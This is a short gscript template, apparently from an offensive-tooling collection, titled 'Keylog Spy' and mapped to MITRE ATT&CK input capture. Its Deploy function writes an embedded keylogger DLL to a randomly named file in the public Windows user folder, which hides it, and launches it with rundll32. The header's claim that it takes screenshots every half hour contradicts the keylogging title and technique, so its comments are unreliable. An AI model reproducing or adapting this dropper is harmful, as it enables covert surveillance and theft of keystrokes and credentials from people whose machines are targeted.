// Example gscript template
// Title: Keylog Spy
// Author: ahhh
// Purpose: Takes screenshots of the desktop every halfhour for the next 24 hours (48 x 1800)
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
// Using ShyGuy: 

//priority:150
//timeout:150
//import:/private/tmp/ShyGuy_x64.dll


function BeforeDeploy() {
  LogInfo("Starting Keylog");
  return true; 
}

function Deploy() {  
  // Drop the sample
  var spy = Asset("ShyGuy_x64.dll");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = "C:\\Users\\Public\\" + name + ".dll";
  WriteFile(name, spy.fileData, 0755);
  LogInfo("dropped the spy binary here: " + name);
  name = name + ",dllmain";
  ForkExecuteCommand("C:\\Windows\\System32\\rundll32.exe", [name]);
  return true;
}

function AfterDeploy() {
  LogInfo("Done Keylog");
  return true;
}
